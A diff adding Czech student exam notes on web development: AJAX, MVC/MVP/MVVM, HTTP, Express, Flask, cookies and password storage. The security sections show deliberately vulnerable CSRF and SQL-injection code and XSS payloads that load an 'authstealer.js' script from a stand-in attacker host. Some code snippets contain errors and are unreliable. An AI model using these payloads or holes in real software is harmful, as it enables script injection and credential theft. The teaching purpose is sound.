@@ -1,0 +1,459 @@
+
+AJAX
+Co znamená zkratka AJAX? Popište princip tohoto způsobu tvorby WWW aplikací a
+základní stavební prvky AJAX kódu.
+
+	AJAX (Asynchronous JavaScript and XML) 
+	Tento princip popisuje webové aplikace které umožnuji nenačítat celou stranku a jenom měnit obsah zmenu kterho uzivatel provedl. 
+	Napřiklad pokud vyhledate ubztovaní a vz ste neco zmenilí ve filtru tak se nactou ne cela stranka s novymí vzsledky a jenom JSON nebo XML s výsledky
+	Takze nejdrive uzivatel načte webovou stranku která obsahuje kliena teto aplikace a po te klijet začne komunikovat se serverem a během te komunikace se pravě načnou weškere jiny data.
+	Tento podhod je užitečnejší pokud chceme jeste mit nativní mobilní aplikace. 
+
+Architektury WWW aplikací
+Jaké jsou hlavní architektury www aplikací? Uvěďte společné rysy, rozdíly, výhody,
+nevýhody.
+
+	Server side rendering 
+	Aplikace je na serveru, uživatele se poskituje jenom HTML, CSS a JS nutne pro zobrazení webové stranky.
+	Klient podstati jenom zobrazuje stranku.
+	Request a response je vždy synchronní.
+
+	Webová služba 
+	je to postati neco jako server z SSR ale ne poskituje HTML ale jenom data JSON nebo XML klientu a ten už tz data spracue nejak sam.
+	Komunikace vetšinou probiha pomoci REST architectury.
+	Request a response muže být synchronní a asynchronní.
+
+	Single Page Aplikace 
+	Kombinace Webové služby, jedné čí více a JS klienta.
+	komunikace probuiha asynchronní klient za běhu aplikace obnavuje častky HTML stranky, cely kod aplikace je v jednem JS soubore z toho i vyplyva nazev Single Page.   
+
+
+
+
+Bezpečnost - CSRF
+Popište v čem spočívá CSRF útok a jak se mu účinně bránit. Uveďte konkrétní příklad
+špatného kódu a vysvětlete co je potřeba upravit aby kód byl zabezpečený proti CSRF.
+
+	CSRF Cross-site request forgery
+		ten to utok spočíta v tom že nejaká webová stranka snaží se poslat data od jine stranký.
+
+	Jako přiklad 
+
+		priklad z přednašky:
+
+		app.post('/', auth.requiresLogin, function(req, res){
+		   let vote = req.body.language;
+		   console.log("hlas pro ", vote);
+		   res.render('vote.html', {
+		            vote: vote
+		    });
+		});
+		
+
+		Použit csurf modul který prida token k form, a taký použit { sameSite: 'strict' } pro cookies
+
+		const csrf = require('csurf');
+
+		//csrf
+		let csrfProtection = csrf({ cookie: true })
+
+		app.post('/', csrfProtection, auth.requiresLogin, function(req, res){
+		   let vote = req.body.language;
+		   console.log("hlas pro ", vote);
+		   res.render('vote.html', {
+		            vote: vote
+		    });
+		});
+
+
+Bezpečnost - injection
+Popište v čem spočívá Injection útok, jak se provádí a jak se mu nejlépe bránit. Uveďte
+konkrétní příklad špatného kódu a vysvětlete co je potřeba upravit, abychom aplikaci
+zabezpečili proti tomuto útoku.
+
+	Nejčastejí jde o SQL Injection, když do SQL requstu bude přidana nejaka hodnota která změní to co by měl vratit ten dotaz
+
+	Přikad:
+
+		function getTasks(username){
+			let sql = `
+				SELECT *
+				FROM TASKS
+				WHERE
+				USERNAME =` + username ;
+			return db.runRequest(sql);
+		}
+
+	Pokud nekdo zada jako username "user OR 1=1"
+
+	Nejlepší rešení je použit paramtricky SQL dotaz a pridat hodnotu pomoci SQL driveru. Jak je uvedené dole:
+	function getTasks(username){
+		let sql = `
+			SELECT *
+			FROM TASKS
+			WHERE
+			USERNAME = (?)`;
+
+		let params = [username];
+
+		return db.runRequest(sql, params);
+	}
+
+
+
+Bezpečnost - XSS
+Popište v čem spočívá XSS útok, jaké znáte druhy a jak se jim nejlépe bránit. Uveďte
+konkrétní příklad špatného kódu a vysvětlete co je potřeba upravit aby kód byl zabezpečený
+proti XSS.
+
+	XSS cross site scripting
+
+	Persistent
+		pridaní do webové stranky HTML tagu napriklad a zpracovani tagu ne jak text a jak validní HTML
+		jako napřiklad pridaní komentař jak 
+
+			"I love the puppies in this story! They're so cute!<script src="http://mallorysevilsite.com/authstealer.js">"
+
+		Řešení je odstranení časti HTML tagu na straně serveru během zpracovování. Takže ve vysledeku tento komentař měl bych vypadat takhle
+
+			 "I love the puppies in this story! They're so cute!" 
+
+	Non-persistent
+		Tento utok spoleha na to, že uživatel nebude davat pozor na jaké odkazy klika a napřiklad 
+
+			http://bobssite.org/search?q=<script>alert('xss');</script>
+
+		muže vypadat takhle 
+
+			http://bobssite.org/search?q=puppies%3Cscript%20src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E
+
+		takže pokud na bobssite.org není ošetren vstup z URL parametrů. Uzivateli se zobrazí alert.
+
+
+Cookies - bezpečnost
+Bezpečnost cookies. Jaké jsou základní bezpečnostní zásady pro použití cookies? Jaká
+znáte nastavení zvyšující bezpečnost cookies?
+
+	Cookies není bezpečny uloziště data. 
+	Uzivatel/zlačinec muže změnit nebo ukrast a vydat se za jineho uživatele.
+
+	Aby tomu ubranit da se nastavit 
+		sameSite 
+					nastavění přistupny pro jiny webove stranky 
+		HttpOnly
+					nastavění přistupny pro JS
+		secure
+					nastavění jestli cookie se dá poslat přez HTTP nebo jenom pomoci HTTPS
+		experation
+					nastavění minimalní trvanlivostí pro cookie
+
+
+Cookies - základní pojmy
+Co jsou Cookies? K čemu všemu se používají? Na jakém principu pracují a jak jsou
+implementované? Jaká je jejich podpora v JavaScriptu? Uveďte jeden konkrétní příklad
+použití v JS (ukázkový kód).
+
+	Cookies je to ulozená na pocitače data které server poslal uživateli, a se odeszlají zpět. 
+	Cookies se dá použit na cokoliv ale vetšinou je to indefikace uzivatele, nebo nastavení pro renderování webové stranky.
+
+	přiklad použiti cookies na straně serveru:
+
+		router.get('/', function (req, res, next) {
+		    if(req.cookies.authorized){
+		        res.redirect('/tasks');
+		        return;
+		    }
+		    res.render('login', {titles:"Login", scriptPath:"/javascripts/loginController.js"});
+		});
+
+DOM
+DOM - co je to DOM? K čemu se využívá? Uveďte hlavní objekty, které nám poskytuje a k
+čemu je můžeme využít. Uveďte hlavní metody a atributy objektu document, které
+využíváme pro manipulaci s elementy. Uveďte jeden konkrétní příklad.
+
+	DOM - document object model
+		Standard určující jak získat, modifikovat, přidat či smazat  element z HTML dokumentu.
+		Přístup k vlastnostem, metodám a událostem každého prvku.
+		Základ pro strojové zpracování HTML
+
+	Prohližeč umožnuji jednochou prace z HTML documentem pomoci pristupu k DOM přes API.
+
+
+
+ExpressJS a HTTP
+ExpressJS - jakým způsobem tento framework zpřístupňuje HTTP dotaz, jak generujeme a
+konfigurujeme HTTP odpověď.
+
+	ve Eprexssu musime zaregestrovat router, pomoci nataveni metody 
+	router.get(cestaNaServeru, function(req, res, next){
+		// req je to objekt popisujici reuqest
+		// res object popisujici reposponce
+		res.render(nazevView, parametrs)
+	}); 
+	app.use(router);
+	
+	Za rendrovani HTML stranky obvykle je zodpovedny render engine jako napřiklad Pug, nebo je mozne vratit html odpoveď použiv write, writeHeader a ukončiv responce end()
+
+		res.writeHeader(200, {"Content-Type": "text/html"});
+	    res.write('<p>Ahoj</p>');
+        res.end();
+
+    Jaká koliv jina konfigurace odpovědi se nastavují pomoci dašich mětod objectu res.
+
+ 
+
+HTTP protokol
+Popište princip a klíčové vlastnosti protokolu HTTP. Uveďte jaké jsou hlavní rozdíly mezi
+verzí 1.1 a 2.
+	Hyper Text Transfer Protocol
+	Zakladní vlastnosti:
+		Bezststavový
+		Nešifrovaný plati jenom pro HTTP
+		Cacheable
+		Široce podporovaný
+
+	HTTP 1.1
+	Pomalejsi verze ktera byla navřena pro male webove stranky, web v roce 1997
+	Nejvetší problemy verzi 1.1:
+		Navržen pro dokumenty, ne aplikace
+		1 request pro 1 TCP spojení
+		Hlavičky - opakované, nekomprimované
+		Klient musí vždy žádat o data
+		Komprese dat není povinná
+
+	HTTP 2
+	Puvodně SPDY protokol navreny Googlem pro zrychleni webu.
+	Rešení problém HTTP 1.1:
+		Multiplex - N requestů po 1 TCP spojení
+		Priorita dotazů - kvůli multiplexu
+		Komprese hlaviček - HPACK algoritmus
+		Server push a hint
+
+
+
+JavaScript - CallBack
+Co je to CallBack? K čemu a proč se v JavaScriptu (JS) používá? Uveďte a vysvětlete jeden
+ukázkový JS kód.
+	Co je to CallBack?
+		je to funkce ktera je predana do jine funkce jak parmetr
+	K čemu a proč se v JavaScriptu (JS) používá? 
+		Když potřeba udělat neco asynchronní tak mužeme přidat calback
+
+	Přiklad 
+
+		function displayResult(text){
+			document.getElementById("result").innerHTML = some;
+		}
+
+		async function updateData(func){
+			let data = await db.getData();
+			func(data);
+		}
+
+		updateData(displayResult);
+
+
+
+JavaScript a HTML.
+Popište způsoby pomocí kterých propojujeme základní HTML kód s Javascriptem. Jak a
+kam můžeme vložit JavaScript kód? Jak zajistíme aby se tento kód vykonal a kdy k vykonání
+dojde? Jak souvisí vykonání kódu s událostmi (event) prohlížeče?
+	
+	V HTML musime pridat do tagu script JS script který chceme nači pro tuto stranku, pak v JS scriptu pracujeme s objectem window a document, taky muzeme zacit odebitar HTML Events
+		
+		<button onclick="document.getElementById('demo').innerHTML = Date()">The time is?</button>
+		<button onclick="timeButtonPressed()">The time is?</button>
+
+	pokud propojime jak na ukazce tak k vykonani dojde pokud uzivatel klikne na tlačitko
+	pokud propojime jak na ukazce dole tak až po nactení webové stranky
+
+		window.onload = function(){
+			const button = document.getElementById('timeButton');
+			const text = document.getElementById('timeText');
+
+			button..addEventListener("click", timeButtonPressed());
+			function timeButtonPressed(){
+				//Tento kod se vykona po kliknuty na tlačitko
+			}
+		};
+
+	Podstate po te co nastane nejaka udalast tak bude zavolan každy listner ktery jí odebira. 
+
+
+
+Návrhový vzor FCP
+Popište návrhový vzor FCP a jeho použití v prostředí www aplikací. Uveďte hlavní výhody,
+nevýhody a příklad využití.
+	
+	FCP - Front Controller Pattern
+	
+		FCP vsechno jde přes jediny vstupni bod aplikace Controller a par requst se predava zpravněmu Dispatheru.
+		Jednodchost nastaveni aplikace protže vsechno je v jenem mistí z toho že duvodu vyplyva složitost skalování.
+		Postati všechny pro a protí vzchzejí z toho že tento navrh ma jediny vstupní bod, to zvyšuje kopleksitu tohoto prvku ale pak jednoduse najit nastavení vsech routu.
+
+		Ve vetšině připadu je použit společne s MVC
+
+		Web framworky Apache Struts a ASP.NET MVC použivají FCP.
+
+
+Návrhový vzor MVC
+Popište návrhový vzor MVC a jeho použití v prostředí www aplikací. Uveďte hlavní výhody a
+nevýhody využití a rozdíly oproti MVP a MVVM.
+
+	MVC - Model View Controller
+	
+	Model
+		data a business logika. Komunikuje s Controllerem a databází. Může aktualizovat view.
+
+	View
+		reprezentace dat (HTML, JSON, atd.). Komunikuje s Controllerem. 
+
+	Controller
+		přijímá HTTP request, zařizuje jeho zpracování
+
+
+	Zakladní návrhový vzor, MVP a MVVM vycházejí z MVC
+
+		MVP neumoznuje  komunikace mezi Model a View všechno jde prez Presenter a vstup zpracovavá View (posyla udalostí Presenteru) a ne Controller, kazdé View má prave jedneho Prestera a Model, v MVC controller může pouzivat vice View a modelů.
+
+		MVVM neumoznuje komunikace mezi Model a View ale jeden ViewModel. 
+
+Návrhový vzor MVP
+Popište návrhový vzor MVP a jeho použití v prostředí www aplikací. Uveďte hlavní výhody a
+nevýhody využití a rozdíly oproti MVC a MVVM.
+
+	MVP - Model View Presenter
+
+	Model
+		 data a business logika. Komunikuje s Presenterem a databází. Může ovlivňovat Presenter.
+
+	View
+		 Uživatelské rozhraní. Komunikuje s právě jedním Presenterem (1:1). Přijímá request.
+
+	Presenter
+		 řídí View, zpracovává akce, komunikuje s Modelem.
+
+
+	 MVP je vyvynuty na zaklade MVC, ale jsou pridany omezení neni povolena komunikace mezi Modelem a View a nastavena vazba 1 ku 1 mezi Presenterem a View
+	 MVVM narozdil od MVP umožnuje jednemu ViewModelu komunikovat s vice než jednym View
+
+
+Návrhový vzor MVVM
+Popište návrhový vzor MVVM a jeho použití v prostředí www aplikací. Uveďte hlavní výhody
+a nevýhody využití a rozdíly oproti MVC a MVP.
+
+	MVVM - Model View ViewModel
+
+	Model
+		 data a business logika. Komunikuje s viewmodelem a databází. 
+
+	View 
+		Uživatelské rozhraní. Zachytává události a předává je dál. Sleduje změny ViewModelu (observer pattern).
+
+	ViewModel 
+		zpracovává události, volá model. Sleduje model pomocí observer vzoru.
+
+	MVVM je vyvynuty na zaklade MVC, ale jsou pridany omezení neni povolena komunikace mezi Modelem a View
+	MVP pridavá ješte další omezení neumožnuje komuikace jedneho View s vice ViewModel
+
+
+Proměnné a konstanty v JavaScriptu.
+Proměnné a konstanty v JavaScriptu (JS). Značení, deklarace, inicializace. Jaký je rozdíl
+mezi deklarací a inicializací? Co provádíme v JavaScriptu deklaraci či inicializaci? Jaké zná
+JS Datové typy a jak probíhá typová kontrola v JavaScriptu. Jaký je rozsah platnosti
+proměnných v JS?
+
+	Deklarace a inicializace
+		let a,b;
+		Konstaty nejde jenom deklarovat.
+
+	Přirazení hodnoty, ale Web
+		var c = 10;
+		const constA = 10; 
+
+	deklarace jenom zaregestruje promennou, inicializace jí přižadi hodnotu, ale podstatí je každa promena vždy má za sebou nejakou hodnotu (Undefined)
+
+	Datový typy
+		Primityvní:
+		    Boolean
+		    Null 
+		    Undefined
+		    Number 
+		    BigInt 
+		    String 
+		    Symbol
+
+		Objects
+
+	V JS my vždy provadime deklarace a inicializace zaroven. Pokud budeme použivat terminologii WebStormu a ne wikipedii a jinšich stranek tak "let a;" je deklarace a "let a = 10;" je deklarace a inicilizace.
+	JS nekontraluje typy sam zkusi pokud programatar napíše "1" + 1 tak JS zkusi to nejak prevest do jedineho typu.
+	Pro kontrolu typu je možne použit typeof
+
+
+Python Flask a HTTP
+Flask (Python) - jakým způsobem tento framework zpřístupňuje HTTP dotaz, jak generujeme
+a konfigurujeme HTTP odpověď.
+
+	Route je cpecifikovan pomoci dekoratoru a metoda pomoci parametru dekoratoru
+
+	render_template umožnuje použiti templatů 
+
+		from flask import Flask, render_template
+
+		app = Flask(__name__)
+
+		@app.route("/", methods=['GET',])
+		def hello_world():
+		    """
+		    funkce render template 
+		    """
+		    title = "WEA - Flask + Jinja"
+		    message = "Také tady šablona pracuje jak má."
+		    return render_template('index.html', title=title, message=message)
+
+	Takže my mužem vytvařet vlastní odpoveď
+
+
+		from flask import Flask, jsonify
+
+
+		@app.route('/users')
+		def get_users():
+		    """
+		    Vrati seznam vsech uzivatelu
+		    """
+		    res = {"success": True, 'users': users}
+		    return jsonify(res)
+
+
+
+Uživatelé a hesla.
+Uživatelé a hesla. V jaké podobě je bezpečné ukládat uživatelská hesla? Jaké hash funkce
+jsou k tomu vhodné, jaké naopak ne a proč? Uveďte a vysvětlete jeden praktický příklad
+použití v JavaScriptu (zdrojový kód).
+	
+	Nejlepší pro ukladtaní hesel použit hash funkce a sůl a musime použivat pomale a složitejši hash funkce protože jinak to bude rychlejši najit heslo odpovidajici hash.
+	Přiklad nevhodně hash funkce je MD5, je lepší použit bcrypt.
+
+	const bcrypt = require('bcrypt');
+	const username = "test"
+	const saltRounds = 10;
+	const myPlaintextPassword = 's0/\/\P4$$w0rD';
+
+	bcrypt.genSalt(saltRounds, function(err, salt) {
+	    bcrypt.hash(myPlaintextPassword, salt, function(err, hash) {
+	        db.createUser(username, hash);
+	    });
+	});
+
+
+Zapomenuté heslo
+Popište správné řešení problému resetu hesla (zapomenuté heslo) na žádost uživatele.
+Zdůvodněte proč je toto řešení nejlepší a uveďte možná úskalí jiných přístupů.
+
+	Najlepší způsob je vygenerovat recovery password token => poslat odkaz s tokenem na email uzivateli => oveřit pristup k učtu pomocí odeslaní verifikačního kódu na telefon nebo jiny email uživatele => pozadata uživatele o nové heslo.
+
+	I ten to způsob se dá obejit pomocí útoku s použitim sociálního inženýrství.
+	Proč neposlat link primo na mail protože zločinec už muže mit pristůp k emailu uživatele.
+
+
